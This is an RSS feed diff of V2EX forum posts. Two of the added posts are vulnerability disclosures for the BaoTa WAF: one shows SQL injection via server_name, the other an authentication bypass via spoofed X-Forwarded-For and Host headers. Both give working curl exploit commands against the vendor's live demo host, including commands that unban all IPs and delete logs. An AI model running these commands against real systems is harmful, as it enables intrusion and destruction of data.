@@ -5,15 +5,194 @@
 <link>https://www.v2ex.com/</link>
 
 <item>
+<title>[服务器] 我又又发现了宝塔的 SQL 注入漏洞</title>
+<link>https://www.v2ex.com/t/1015934</link>
+<guid>https://www.v2ex.com/t/1015934</guid>
+<content:encoded><![CDATA[
+
+<p>接上篇文章，<a href="https://v2ex.com/t/1015932" rel="nofollow">在测试宝塔 WAF 的未授权访问漏洞</a>时无意间还发现了一个 SQL 注入漏洞，品相还不错，可执行任意 SQL 语句。</p>
+<p>总之，吃了一惊，一个防 SQL 注入的工具居然也有 SQL 注入漏洞。</p>
+<p>请看这段代码</p>
+<pre><code class="language-bash">get_site_status = function ()
+	if not ngx.ctx.get_uri_args.server_name then
+		return Public.get_return_state(false, "参数错误")
+	end
+
+	... 此处省略若干代码
+
+	slot7, slot8, slot9, slot10 = slot4.query(slot4, [[
+SELECT 
+		SUM(request) as req,
+		SUM(err_40x) as err_40x,
+		SUM(err_500) as err_500,
+		SUM(err_502) as err_502,
+		SUM(err_503) as err_503,
+		SUM(err_504) as err_504,
+		SUM(err_499) as err_499,
+		SUM(send_bytes) as send_bytes,
+		SUM(receive_bytes) as recv_bytes,
+		SUM(pc_count) as pc_count,
+		SUM(mobile_count) as mobile_count,
+		SUM(spider_baidu) as spider_baidu,
+		SUM(spider_google) as spider_google,
+		SUM(spider_bing) as spider_bing,
+		SUM(spider_360) as spider_360,
+		SUM(spider_sogou) as spider_sogou,
+		SUM(spider_other) as spider_other,
+		SUM(ip_count) as ip_count,
+		SUM(pv_count) as pv_count,
+		SUM(uv_count) as uv_count
+		 FROM `request_total` WHERE `server_name`=']] .. slot1 .. "' AND `date`='" .. os.date("%Y-%m-%d") .. "'")
+
+	... 此处省略若干代码
+
+	return Public.get_return_state(true, slot6)
+end
+</code></pre>
+<p>这段代码位于 <code>/cloud_waf/nginx/conf.d/waf/public/waf_route.lua</code>  文件中，源文件是 luajit 编译后的内容，反编译一下即可看到源码</p>
+<p>这段逻辑就在上文提到的 get_site_status API 中，slot1 变量就是 server_name 参数。原理很简单，server_name 参数没有做任何校验就直接带入了 SQL 查询。</p>
+<p>宝塔官网还没有修复这个问题，还是拿宝塔官网为例，试试以下命令：</p>
+<pre><code class="language-bash">curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,database()))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
+</code></pre>
+<p>响应如下</p>
+<pre><code class="language-bash">{"status":false,"msg":"数据查询失败: XPATH syntax error: '\\btwaf': 1105: HY000."}
+</code></pre>
+<p>从响应来看已经注入成功，通过 updatexml 的报错成功的爆出了库名叫 btwaf</p>
+<p>继续执行以下命令：</p>
+<pre><code class="language-bash">curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,version()))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
+</code></pre>
+<p>响应如下</p>
+<pre><code class="language-bash">{"status":false,"msg":"数据查询失败: XPATH syntax error: '\\8.1.0': 1105: HY000."}
+</code></pre>
+<p>从响应来看，mysql 版本是 8.1.0</p>
+<p>在继续执行以下命令</p>
+<pre><code class="language-bash">curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,(select'hello,world')))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
+</code></pre>
+<p>响应如下</p>
+<pre><code class="language-bash">{"status":false,"msg":"数据查询失败: XPATH syntax error: '\\hello,world': 1105: HY000."}
+</code></pre>
+<p>看起来 select 'hello,world' 也执行成功了，到此为止，基本可以执行任意命令。</p>
+<p>漏洞已通报给宝塔官方，此漏洞危害较大，各位宝塔用户请关注宝塔官方补丁，及时更新。</p>
+]]></content:encoded>
+<pubDate>2024-02-16T19:21:19Z</pubDate>
+<pubDate>2024-02-16T15:21:19Z</pubDate>
+</item>
+<item>
+<title>[服务器] 我发现了宝塔的未授权访问漏洞</title>
+<link>https://www.v2ex.com/t/1015932</link>
+<guid>https://www.v2ex.com/t/1015932</guid>
+<content:encoded><![CDATA[
+
+<p>接上篇文章，继过年前发现<a href="https://www.freebuf.com/vuls/390723.html" rel="nofollow">宝塔 WAF 后台的命令注入漏洞</a>后，寒假期间闲着无事，过年又不想跑亲戚，又翻了翻宝塔的代码，再一次发现了重大漏洞。</p>
+<p>大过年还在看代码真是不容易，宝塔请给我广告费+代码审计费。</p>
+<p>整个宝塔 WAF 核心防护功能的代码写的确实有点粗糙，代码组织方式不像一个成熟软件该有的架构，小 Bug 一眼望不到头，今天分享的是一个未授权访问漏洞，普通用户可以无视宝塔的随机登录地址，无视宝塔的登录密码，直接操作后台的数据，实现人人都是管理员的效果。</p>
+<p>请看这段代码</p>
+<pre><code class="language-bash">start = function ()
+	... 此处身略若干行
+	if ngx.var.remote_addr == "127.0.0.1" and ngx.ctx.Server_name == "127.0.0.251" and ngx.var.host == "127.0.0.251" then
+		if ngx.var.uri == "/get_btwaf_drop_ip" then
+			Public.return_message(200, uv0.get_btwaf_drop_ip())
+		elseif ngx.var.uri == "/remove_btwaf_drop_ip" then
+			Public.return_message(200, uv0.remove_btwaf_drop_ip())
+		elseif ngx.var.uri == "/clean_btwaf_drop_ip" then
+			Public.return_message(200, uv0.clean_btwaf_drop_ip())
+		elseif ngx.var.uri == "/updateinfo" then
+			Public.return_message(200, uv0.updateInfo())
+		elseif ngx.var.uri == "/get_site_status" then
+			Public.return_message(200, uv0.get_site_status())
+		elseif ngx.var.uri == "/get_global_status" then
+			Public.return_message(200, uv0.get_global_status())
+		end
+
+		if ngx.var.uri == "/clean_btwaf_logs" then
+			Public.return_message(200, uv0.clean_btwaf_logs())
+		end
+
+		if ngx.var.uri == "/clear_speed_hit" then
+			Public.return_message(200, uv0.clear_speed_hit())
+		end
+
+		if ngx.var.uri == "/clear_replace_hit" then
+			Public.return_message(200, uv0.clear_replace_hit())
+		end
+
+		if ngx.var.uri == "/reset_customize_cc" then
+			Public.return_message(200, uv0.reset_customize_cc())
+		end
+
+		if ngx.var.uri == "/clear_speed_countsize" then
+			Public.return_message(200, uv0.clear_speed_countsize())
+		end
+	end
+end
+</code></pre>
+<p>这段代码位于 <code>/cloud_waf/nginx/conf.d/waf/public/waf_route.lua</code>  文件中，源文件是 luajit 编译后的内容，反编译一下即可看到源码。</p>
+<p>看代码最开端的 if 语句，只要满足 ip 是 127.0.0.1 ，域名是 127.0.0.251 这两个条件就能在不用登录的情况下访问下面的 API 。</p>
+<p>话说这是临时工写的代码吧，对于宝塔的配置来说，要满足这两个条件很难吗？</p>
+<ul>
+<li>配置 x-forwarded-for 头为 127.0.0.1 即可满足 ip 是 127.0.0.1 的条件</li>
+<li>配置 host 头为 127.0.0.251 即可满足域名是 127.0.0.251 的条件</li>
+</ul>
+<p>提供一条 curl 参数供大家参考</p>
+<pre><code class="language-bash">curl 'http://宝塔地址/API'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
+</code></pre>
+<p>到此漏洞原理就讲完了</p>
+<p>我们访问宝塔官方网站做个测试</p>
+<h3>get_btwaf_drop_ip</h3>
+<p>这个 API 用来获取已经拉黑的 IP 列表，使用以下命令发起访问</p>
+<pre><code class="language-bash">curl 'http://btwaf-demo.bt.cn/get_btwaf_drop_ip'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
+</code></pre>
+<h3>remove_btwaf_drop_ip</h3>
+<p>这个 API 用来解封 IP ，提供一个 get 参数即可，使用以下命令发起访问</p>
+<pre><code class="language-bash">curl 'http://btwaf-demo.bt.cn/remove_btwaf_drop_ip?ip=1.2.3.4'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
+</code></pre>
+<p>响应如下</p>
+<pre><code class="language-bash">{"msg":"1.2.3.4 已解封","status":true}
+</code></pre>
+<h3>clean_btwaf_drop_ip</h3>
+<p>这个 API 用来解封所有 IP ，使用以下命令发起访问</p>
+<pre><code class="language-bash">curl 'http://btwaf-demo.bt.cn/clean_btwaf_drop_ip'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
+</code></pre>
+<p>响应如下</p>
+<pre><code class="language-bash">{"msg":"已解封所有 IP","status":true}
+</code></pre>
+<h3>updateinfo</h3>
+<p>这个 API 看起来是更新配置用的，需要一个 types 参数做校验，但实际并没有什么用处，使用以下命令发起访问</p>
+<pre><code class="language-bash">curl 'http://btwaf-demo.bt.cn/updateinfo?types'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
+</code></pre>
+<h3>get_site_status</h3>
+<p>这个 API 用来获取网站的配置，server_name 参数需要提供网站的域名，使用以下命令发起访问</p>
+<pre><code class="language-bash">curl 'http://btwaf-demo.bt.cn/get_site_status?server_name=bt.cn'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
+</code></pre>
+<p>响应如下</p>
+<pre><code class="language-bash">{"status":true,"msg":{"uv":0,"qps":0,"inland":0,"overseas":0,"today":{"pc_count":0,"mobile_count":0,"req":0,"spider_google":0,"spider_bing":0,"spider_sogou":0,"spider_360":0,"spider_other":0,"err_40x":0,"spider_baidu":0,"recv_bytes":0,"send_bytes":0,"err_500":0,"err_502":0,"err_503":0,"err_504":0,"err_499":0,"uv_count":0,"ip_count":0,"pv_count":0},"send_bytes":0,"proxy_count":0,"err_502":0,"recv_bytes":0,"err_504":0,"err_499":0,"ip":0,"proxy_time":0,"pv":0}}
+</code></pre>
+<h3>clean_btwaf_logs</h3>
+<p>这个 API 用来删除宝塔的所有日志，使用以下命令发起访问</p>
+<pre><code class="language-bash">curl "http://btwaf-demo.bt.cn/clean_btwaf_logs"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
+</code></pre>
+<p>后续还有一些 API 大同小异，不一一列举了</p>
+<ul>
+<li>get_global_status</li>
+<li>clear_speed_hit</li>
+<li>clear_replace_hit</li>
+<li>reset_customize_cc</li>
+<li>clear_speed_countsize</li>
+</ul>
+<p>漏洞已通报给宝塔官方，此漏洞危害较大，各位宝塔用户请关注宝塔官方补丁，及时更新。</p>
+]]></content:encoded>
+<pubDate>2024-02-16T18:36:02Z</pubDate>
+<pubDate>2024-02-16T15:36:02Z</pubDate>
+</item>
+
+<item>
 <title>[Android] Galaxy S24 Ultra 和 HUAWEI Mate 60 该怎么选</title>
 <link>https://www.v2ex.com/t/1015931</link>
 <guid>https://www.v2ex.com/t/1015931</guid>
 <content:encoded><![CDATA[
-
 <p>今天去三星门店销售悄悄说他们不是一个级别，无法放在一起对比。
 我瞬间信了。</p>
 ]]></content:encoded>
-<pubDate>2024-02-16T17:43:02Z</pubDate>
 <pubDate>2024-02-16T18:19:51Z</pubDate>
 </item>
 <item>
@@ -21,10 +200,8 @@
 <link>https://www.v2ex.com/t/1015930</link>
 <guid>https://www.v2ex.com/t/1015930</guid>
 <content:encoded><![CDATA[
-
 apt upgrade 以后，不定时系统崩溃，能看出原因吗？<br /><br /><a href="https://i.imgur.com/ghLjbNl.jpeg" rel="nofollow noopener" target="_blank"><img class="embedded_image" rel="noreferrer" src="https://i.imgur.com/ghLjbNl.jpeg" /></a>
 ]]></content:encoded>
-<pubDate>2024-02-16T17:28:36Z</pubDate>
 <pubDate>2024-02-16T13:28:36Z</pubDate>
 </item>
 <item>
@@ -32,12 +209,10 @@ apt upgrade 以后，不定时系统崩溃，能看出原因吗？<br /><br /><a
 <link>https://www.v2ex.com/t/1015929</link>
 <guid>https://www.v2ex.com/t/1015929</guid>
 <content:encoded><![CDATA[
-
 <p>国内外 it 行业投简历与职位比，貌似都超过 100 比 1 ，红海</p>
 <p>那是否有新的蓝海职业，值得我们现在转向掉头呢？</p>
 <p>想听听大家的认识与见解</p>
 ]]></content:encoded>
-<pubDate>2024-02-16T17:23:17Z</pubDate>
 <pubDate>2024-02-16T18:08:03Z</pubDate>
 </item>
 <item>
@@ -45,10 +220,8 @@ apt upgrade 以后，不定时系统崩溃，能看出原因吗？<br /><br /><a
 <link>https://www.v2ex.com/t/1015928</link>
 <guid>https://www.v2ex.com/t/1015928</guid>
 <content:encoded><![CDATA[
-
 在不登陆 Google 的情况下
 ]]></content:encoded>
-<pubDate>2024-02-16T16:36:55Z</pubDate>
 <pubDate>2024-02-16T16:50:14Z</pubDate>
 </item>
 <item>
@@ -56,7 +229,6 @@ apt upgrade 以后，不定时系统崩溃，能看出原因吗？<br /><br /><a
 <link>https://www.v2ex.com/t/1015927</link>
 <guid>https://www.v2ex.com/t/1015927</guid>
 <content:encoded><![CDATA[
-
 <h3>背景信息</h3>
 <p>近期我购买了 2t 的移动硬盘，因为后续还有连接 Windows 平台使用的需求，为方便 Mac 和 Windows 共同使用（出于数据安全性需要 Exfat 没有考虑），我将硬盘设置为来 NTFS 格式。</p>
 <h3>软件选择</h3>
@@ -74,7 +246,6 @@ apt upgrade 以后，不定时系统崩溃，能看出原因吗？<br /><br /><a
 </ol>
 <p>同时我也想了解一下大家对于 Mac 端 NTFS 格式软件使用的看法和选取建议，十分感谢。感谢大佬们！第一次发帖如有问题多多海涵。</p>
 ]]></content:encoded>
-<pubDate>2024-02-16T16:29:49Z</pubDate>
 <pubDate>2024-02-16T17:42:05Z</pubDate>
 </item>
 <item>
@@ -82,7 +253,6 @@ apt upgrade 以后，不定时系统崩溃，能看出原因吗？<br /><br /><a
 <link>https://www.v2ex.com/t/1015926</link>
 <guid>https://www.v2ex.com/t/1015926</guid>
 <content:encoded><![CDATA[
-
 <h2>背景</h2>
 <p>我是个去年大专毕业的, 今年是 22 岁.</p>
 <p>哎, 当时轻视了专转本的难度, 直接就没考上. 说句实话也是个废物.</p>
@@ -118,10 +288,8 @@ apt upgrade 以后，不定时系统崩溃，能看出原因吗？<br /><br /><a
 <p>这是我第一次在互联网上求助, 因为附近真找不到什么人能理解发生了什么事情了, 求求各位给我一些建议, 拜托了</p>
 </blockquote>
 ]]></content:encoded>
-<pubDate>2024-02-16T16:24:18Z</pubDate>
 <pubDate>2024-02-15T22:41:16Z</pubDate>
 </item>
-
 <item>
 <title>[问与答] 求助大佬们： Mongo DB Compass 加 socks5 代理连不上 MongoDB Atlas 上的库</title>
 <link>https://www.v2ex.com/t/1015925</link>
@@ -15254,97 +15422,6 @@ wireguard 是我用过的所有协议里客户端做的最好最清爽的了，�
 <a href="https://code.visualstudio.com/docs/remote/linux#_tips-by-linux-distribution" rel="nofollow noopener" target="_blank">https://code.visualstudio.com/docs/remote/linux#_tips-by-linux-distribution</a><br /><br />不小心升级到 v1.86 的请自行降级回 v1.85.2 ，禁用自动升级功能，并且要卸载、重装 Remote - SSH<br /> 这个插件
 ]]></content:encoded>
 <pubDate>2024-02-06T08:30:26Z</pubDate>
-</item>
-<item>
-<title>[云计算] 现在 onedrive 还有什么容量大性价比高的订阅选择么？</title>
-<link>https://www.v2ex.com/t/1014748</link>
-<guid>https://www.v2ex.com/t/1014748</guid>
-<content:encoded><![CDATA[
-现在 onedrive 还有什么容量大性价比高的订阅选择么？想搞个稳定点的，网上的开发版在用，怕不稳定，付费的会不会稳一点呢，想搞个搭 alist 。<br /><br />或者，有什么大容量下载速度还不错的搭建 alist 的网盘值得推荐？
-]]></content:encoded>
-<pubDate>2024-02-06T12:16:09Z</pubDate>
-</item>
-<item>
-<title>[程序员] 如何避免机械硬盘久放, 电机坏掉</title>
-<link>https://www.v2ex.com/t/1014747</link>
-<guid>https://www.v2ex.com/t/1014747</guid>
-<content:encoded><![CDATA[
-用于数据冷备份的 3.5 寸机械硬盘, 长时间(半年以上)不上电, 电机不转了҄, 不能识别分区, dmesg 能看҉到硬盘厂商信息, 没听到电机转动的声音.<br /><br />1. 所以怎么避免这种情况再次发生?<br />2. 200G 左右的数据,如果加密放国外网҄盘, 哪家便宜且靠谱(不被删, 无速度要求)?
-]]></content:encoded>
-<pubDate>2024-02-06T07:24:02Z</pubDate>
-</item>
-<item>
-<title>[VPS] Termius 隔一段时间断开 vps，什么原因？</title>
-<link>https://www.v2ex.com/t/1014746</link>
-<guid>https://www.v2ex.com/t/1014746</guid>
-<content:encoded><![CDATA[
-<p>是 vps 的原因还是 termius 造成的，有什么办法让其保持永远连线么？</p>
-<p>还是说为了保持程序一直运行，只能用 nohup &amp; 保持后台运行，</p>
-<p>有保持程序在前台一直运行的办法？</p>
-]]></content:encoded>
-<pubDate>2024-02-06T11:27:36Z</pubDate>
-</item>
-<item>
-<title>[酷工作] [字节 TikTok 电商招聘] TikTok 国际电商-商业平台招聘前端工程师/前端 Leader</title>
-<link>https://www.v2ex.com/t/1014745</link>
-<guid>https://www.v2ex.com/t/1014745</guid>
-<content:encoded><![CDATA[
-<h2>部门挺缺人的，最近过完年又新增不少 HC ，欢迎联系，微信: rect123</h2>
-<h2>职位 JD: <a href="https://www.v2ex.com/t/1008283#reply5" rel="nofollow">https://www.v2ex.com/t/1008283#reply5</a></h2>
-]]></content:encoded>
-<pubDate>2024-02-06T11:17:57Z</pubDate>
-</item>
-<item>
-<title>[分享创造] [阅牍产品故事 9] 阅牍(Readary)RSS 阅读器年前最后一版，支持了夜间模式，调整了价格</title>
-<link>https://www.v2ex.com/t/1014744</link>
-<guid>https://www.v2ex.com/t/1014744</guid>
-<content:encoded><![CDATA[
-<h1>会员调整</h1>
-<p>下架 [永久会员] ，改为 3 年会员包，已经购买的永久会员不受影响。最近部分用户反馈永久会员价格贵了，而且我自己也觉得承诺永久压力太大了，这本身就是个谎言，因为不可能永久维护。于是把永久改成 3 年会员包，降低了价格。目前费用：</p>
-<ol>
-<li>12/月</li>
-<li>78/年</li>
-<li>188/3 年</li>
-</ol>
-<p>下载链接: <a href="https://apps.apple.com/us/app/readary/id6449085999" rel="nofollow">App Store</a></p>
-<h1>夜间模式</h1>
-<p>很多用户反馈希望有这个功能，终于做出来了</p>
-<h1>下一步规划</h1>
-<ol>
-<li>过年期间加个班，希望年后回来把 mac 版更新出来</li>
-<li>阅读字体大小、间距自定义</li>
-<li>iCould 同步配置、关键词、主题、文章阅读进度等</li>
-</ol>
-<h1>历史连载</h1>
-<ol>
-<li><a href="https://www.v2ex.com/t/972052#reply34" rel="nofollow">阅牍产品故事 1-缘起</a></li>
-<li><a href="https://www.v2ex.com/t/973945#reply2" rel="nofollow">阅牍产品故事 2-支持 Cubox</a></li>
-<li><a href="https://www.v2ex.com/t/980554#reply4" rel="nofollow">阅牍产品故事 3-支持关键词筛选</a></li>
-<li><a href="https://www.v2ex.com/t/985188#reply5" rel="nofollow">阅牍产品故事 4-支持自定义主题</a></li>
-<li><a href="https://www.v2ex.com/t/989010#reply8" rel="nofollow">阅牍产品故事 5-支持自动归档与后台更新</a></li>
-<li><a href="https://www.v2ex.com/t/993230#reply44" rel="nofollow">阅牍产品故事 6-开通会员功能</a></li>
-<li><a href="https://www.v2ex.com/t/1005758#reply14" rel="nofollow">阅牍产品故事 7-支持翻译</a></li>
-<li><a href="https://www.v2ex.com/t/1011745#reply12" rel="nofollow">阅牍产品故事 8-支持 iPad</a></li>
-</ol>
-<h1>截图</h1>
-<p><img alt="" class="embedded_image" rel="noreferrer" src="https://i.v2ex.co/5H05325Z.png" /></p>
-<p><img alt="" class="embedded_image" rel="noreferrer" src="https://i.v2ex.co/GqV6PvM7.png" /></p>
-<p><img alt="" class="embedded_image" rel="noreferrer" src="https://i.v2ex.co/15N8kdjH.png" /></p>
-]]></content:encoded>
-<pubDate>2024-02-06T11:49:16Z</pubDate>
-</item>
-<item>
-<title>[宽带症候群] 国内直连 api.nuget.org 的问题</title>
-<link>https://www.v2ex.com/t/1014743</link>
-<guid>https://www.v2ex.com/t/1014743</guid>
-<content:encoded><![CDATA[
-<p>今天公司 jenkins 的 dotnet 项目打包开始报错，发现项目构建时请求 <code><a href="http://api.nuget.org" rel="nofollow">api.nuget.org</a></code> 失败。
-<img alt="部分错误信息" class="embedded_image" rel="noreferrer" src="https://i.imgur.com/iXLALEO.png" /></p>
-<p>之后请求发现国内直连时候会重定向到 <code><a href="http://nuget.cdn.azure.cn" rel="nofollow">nuget.cdn.azure.cn</a></code>，然后再请求就是 <code>Connection reset</code>。</p>
-<p>而且恶心的是有时候第一次请求能拿到，再访问一次就打不开了。看看大家有没有类似的问题。</p>
-<p>可以尝试如下链接：<a href="https://api.nuget.org/v3-flatcontainer/system.globalization/index.json" rel="nofollow">https://api.nuget.org/v3-flatcontainer/system.globalization/index.json</a></p>
-]]></content:encoded>
-<pubDate>2024-02-06T11:17:48Z</pubDate>
 </item>
 </channel>
 </rss>
